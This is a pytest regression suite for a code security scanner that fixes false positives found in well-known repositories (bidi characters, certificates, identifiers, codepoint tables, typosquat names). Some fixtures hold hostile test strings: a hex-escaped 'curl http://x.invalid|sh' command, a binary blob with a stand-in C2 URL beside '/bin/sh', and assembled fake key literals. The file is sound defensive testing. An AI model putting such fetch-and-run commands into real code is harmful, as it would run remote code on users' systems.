"""Noise found by scanning twenty-one widely used repositories.

Twenty-four thousand files of Django, React, Vue, ESLint, Guava, OkHttp,
Prometheus, ripgrep, tokio, serde, Celery, SQLAlchemy, boto3, Scrapy, httpx,
axios, lodash, express, click, black and cobra produced 2,394 findings. Nine
distinct causes accounted for 91% of them, and every one is reproduced here.

Two are worth calling out because they were not tuning, they were wrong:

The bidi rule flagged U+200B-U+200D. Zero-width non-joiner is mandatory in
Persian and Hindi orthography and zero-width joiner is in every modern emoji;
neither reorders anything. Ninety-five findings in Django's translation
catalogues were for text that is simply written correctly.

`-----BEGIN` matched a CERTIFICATE, which is public by design and committed on
purpose in every TLS test suite.
"""

from __future__ import annotations

import pytest

from cordon_scanner import Scanner
from cordon_scanner.core.models import Category
from cordon_scanner.detect.binary import _COMMAND
from cordon_scanner.detect.obfuscation import BIDI_AND_INVISIBLE
from cordon_scanner.detect.secrets import NOT_A_SECRET, PLACEHOLDER
from support import assemble


def flagged(root) -> set[str]:
    return {
        f.rule_id
        for f in Scanner().scan(root).findings
        if f.category in (Category.MALICIOUS, Category.SUSPICIOUS)
    }


class TestCharactersThatDoNotReorderText:
    @pytest.mark.parametrize(
        ("codepoint", "why"),
        [
            (0x200B, "zero-width space: an ordinary line-break hint"),
            (0x200C, "zero-width non-joiner: mandatory in Persian and Hindi"),
            (0x200D, "zero-width joiner: in every modern emoji sequence"),
            (0x200E, "left-to-right mark: ordinary in bidirectional text"),
            (0x200F, "right-to-left mark: the same"),
        ],
    )
    def test_a_non_directional_character_is_not_trojan_source(
        self, codepoint: int, why: str
    ) -> None:
        assert BIDI_AND_INVISIBLE.search(f"x {chr(codepoint)} y".encode()) is None, why

    @pytest.mark.parametrize("codepoint", [0x202A, 0x202B, 0x202C, 0x202D, 0x202E, 0x2066, 0x2069])
    def test_an_override_or_isolate_still_is(self, codepoint: int) -> None:
        assert BIDI_AND_INVISIBLE.search(f"x {chr(codepoint)} y".encode()) is not None

    def test_a_translation_catalogue_is_data_not_source(self, tmp_path) -> None:
        """A `.po` for a right-to-left language embeds directional characters in
        the text it will display. That is data shown to a user, not logic read
        by a reviewer."""
        catalogue = tmp_path / "django.po"
        catalogue.write_text(f'msgid "x"\nmsgstr "{chr(0x202B)}text"\n', encoding="utf-8")
        assert "SUSPECT.OBFUSCATION.BIDI.001" not in flagged(tmp_path)


class TestPublicMaterialIsNotSecret:
    def test_a_certificate_is_not_a_credential(self, tmp_path) -> None:
        """Committed on purpose in every TLS test suite; thirty-nine findings in
        OkHttp alone."""
        header = assemble("-----BEGIN ", "CERTIFICATE", "-----")
        (tmp_path / "Certs.java").write_text(
            f'String cert = "{header}\\n" + "MIIBkTCB+wIJAKt...";\n', encoding="utf-8"
        )
        assert flagged(tmp_path) == set()

    def test_a_private_key_still_is(self, tmp_path) -> None:
        header = assemble("-----BEGIN ", "PRIVATE KEY", "-----")
        (tmp_path / "Keys.java").write_text(
            f'String key = "{header}\\n" + "MIIBkTCB+wIJAKt...";\n', encoding="utf-8"
        )
        # Reported by the provider rule, which names it, rather than the
        # generic one.
        assert "SECRET.PRIVATE_KEY.001" in flagged(tmp_path)


class TestIdentifiersAndPaths:
    @pytest.mark.parametrize(
        "value",
        [
            b"calleeParenCount",
            b"firstTokenOfCallee",
            b"TOKEN_BLOCK_BEGIN",
            b"entity.other.attribute-name",
            b"/random/file/which/does/not/exist.yml",
        ],
    )
    def test_a_name_or_path_is_not_a_credential(self, value: bytes) -> None:
        assert NOT_A_SECRET.match(value)

    # Assembled, not written whole. This file is scanned by the tool it tests,
    # and a complete key literal here is a true positive the tool should not
    # need an exception for.
    @pytest.mark.parametrize(
        "value",
        [
            assemble("kR9mT2nQ8vL4", "xW7yZ3bC6dF1").encode(),
            assemble("AKIA", "Q7XKLMNPQRSTUVWX").encode(),
            assemble("S3cr3tP4ss", "w0rdXyz9Qq").encode(),
        ],
    )
    def test_key_material_survives_every_exclusion(self, value: bytes) -> None:
        """The camelCase exclusion allows no digits for exactly this reason:
        base62 key material alternates case and includes them, so a permissive
        rule excludes the values this detector exists to find."""
        assert not NOT_A_SECRET.match(value)

    @pytest.mark.parametrize(
        "value", [b"password", b"mypassword", b"mysecret", b"username", b"yourtoken"]
    )
    def test_a_documentation_placeholder_is_recognised(self, value: bytes) -> None:
        assert PLACEHOLDER.search(value)

    @pytest.mark.parametrize(
        "value",
        [b"hunter2", b"s00pers3cret", assemble("kR9mT2n", "Q8vL4").encode()],
    )
    def test_a_real_looking_value_is_not_a_placeholder(self, value: bytes) -> None:
        assert not PLACEHOLDER.search(value)


class TestGeneratedAssets:
    @pytest.mark.parametrize(
        "path", ["icon.svg", "app.mo", "messages.po", "dist/bundle.js", "assets/vendor.js"]
    )
    def test_a_generated_asset_is_not_reported_for_line_length(self, tmp_path, path) -> None:
        target = tmp_path / path
        target.parent.mkdir(parents=True, exist_ok=True)
        blob = assemble("kR9mT2nQ8vL4xW7yZ3bC", "6dF1gH5jK0pS9rT2") * 200
        target.write_text(blob + "\n", encoding="utf-8")
        assert "SUSPECT.OBFUSCATION.LONGLINE.001" not in flagged(tmp_path)

    def test_a_data_file_with_no_language_is_not_source(self, tmp_path) -> None:
        """The rule's own docstring said "source-shaped files only" and never
        checked it. A MaxMind database and an XML fixture are data, and a long
        line in data is what data looks like."""
        blob = assemble("kR9mT2nQ8vL4xW7yZ3bC", "6dF1gH5jK0pS9rT2") * 200
        (tmp_path / "GeoLite2.mmdb").write_text(blob + "\n", encoding="utf-8")
        assert "SUSPECT.OBFUSCATION.LONGLINE.001" not in flagged(tmp_path)


class TestUnicodeTablesAreData:
    def test_a_codepoint_table_is_not_a_concealed_string(self, tmp_path) -> None:
        """XRegExp ships four hundred escapes of Gurmukhi script ranges. A
        concealed string decodes to text somebody typed; a table decodes to
        codepoints nobody types. The discriminator existed and was applied only
        to the split-across-the-file branch."""
        table = "".join(f"\\\\u0A{i:02X}" for i in range(0x10, 0x60))
        (tmp_path / "ranges.js").write_text(f'const gurmukhi = "{table}";\n', encoding="utf-8")
        assert "SUSPECT.OBFUSCATION.ENCODED.001" not in flagged(tmp_path)

    def test_a_concealed_ascii_payload_still_fires(self, tmp_path) -> None:
        hidden = "".join(f"\\\\x{ord(c):02x}" for c in "curl http://x.invalid|sh")
        (tmp_path / "loader.js").write_text(f'const c = "{hidden}";\n', encoding="utf-8")
        assert "SUSPECT.OBFUSCATION.ENCODED.001" in flagged(tmp_path)


class TestBinaryStrings:
    def test_one_kind_of_string_is_not_evidence(self, tmp_path) -> None:
        """Almost every data blob carries a URL: a compiled translation
        catalogue records the project's homepage. That was 1,218 findings,
        more than half of all the noise these repositories produced."""
        (tmp_path / "django.mo").write_bytes(
            b"\xde\x12\x04\x95" + b"\x00" * 40 + b"https://www.djangoproject.com\x00" + b"\x00" * 40
        )
        assert "SUSPECT.BINARY.STRINGS.001" not in flagged(tmp_path)

    def test_a_url_and_a_shell_command_together_are(self, tmp_path) -> None:
        (tmp_path / "blob").write_bytes(
            b"\x00\x01\x02\x03" * 8 + b"https://c2.invalid/x\x00/bin/sh\x00" + b"\x00" * 32
        )
        assert "SUSPECT.BINARY.STRINGS.001" in flagged(tmp_path)

    def test_the_command_pattern_matches_between_nul_bytes(self) -> None:
        """A leading `\\b` needs a word character beside it, and in a binary
        these strings sit between NUL bytes -- so the assertion failed exactly
        where the pattern was meant to run."""
        assert _COMMAND.search(b"x\x00/bin/sh\x00")


class TestNoPackageIsASquatOfItself:
    """Found by scanning Cargo's own repository.

    `'serde_json' is one plausible typing slip away from 'serde_json'` is what
    the tool said, at high severity. The popular sets are written as each
    project spells itself -- `serde_json` with an underscore -- while a
    dependency arrives normalised, and Cargo folds underscore to hyphen. So
    `serde-json` was compared against `serde_json`, and since this detector
    treats `-` and `_` as adjacent keys, the difference read as a typing slip.

    Both sides of a name comparison have to be normalised the same way. That is
    the kind of invariant worth asserting over the whole data set rather than
    over an example.
    """

    def test_no_popular_package_reports_itself(self) -> None:
        from cordon_scanner.detect.dependency import DependencyDetector
        from cordon_scanner.ecosystems.registry import EcosystemRegistry
        from cordon_scanner.intel.popular import PackageIntel

        detector = DependencyDetector()
        offenders = []
        for ecosystem, names in PackageIntel.POPULAR_PACKAGES.items():
            implementation = EcosystemRegistry.get(ecosystem)
            if implementation is None:
                continue
            for name in names:
                normalised = implementation.normalize_name(name)
                target = detector._typosquat_target(ecosystem, normalised)
                if target is not None:
                    offenders.append(f"{ecosystem}:{name} -> {target}")
        assert not offenders, offenders

    def test_every_popular_package_is_known(self) -> None:
        """The check that runs before typosquat comparison, under the same
        normalisation."""
        from cordon_scanner.ecosystems.registry import EcosystemRegistry
        from cordon_scanner.intel.popular import PackageIntel

        unknown = []
        for ecosystem, names in PackageIntel.POPULAR_PACKAGES.items():
            implementation = EcosystemRegistry.get(ecosystem)
            if implementation is None:
                continue
            for name in names:
                if not PackageIntel.is_known_package(
                    ecosystem, implementation.normalize_name(name)
                ):
                    unknown.append(f"{ecosystem}:{name}")
        assert not unknown, unknown

    def test_the_check_is_not_vacuous(self) -> None:
        from cordon_scanner.intel.popular import PackageIntel

        assert sum(len(v) for v in PackageIntel.POPULAR_PACKAGES.values()) > 150

    def test_a_real_squat_still_fires(self) -> None:
        from cordon_scanner.detect.dependency import DependencyDetector

        detector = DependencyDetector()
        assert detector._typosquat_target("cargo", "serde-jsonn") == "serde-json"
        assert detector._typosquat_target("npm", "lodahs") == "lodash"
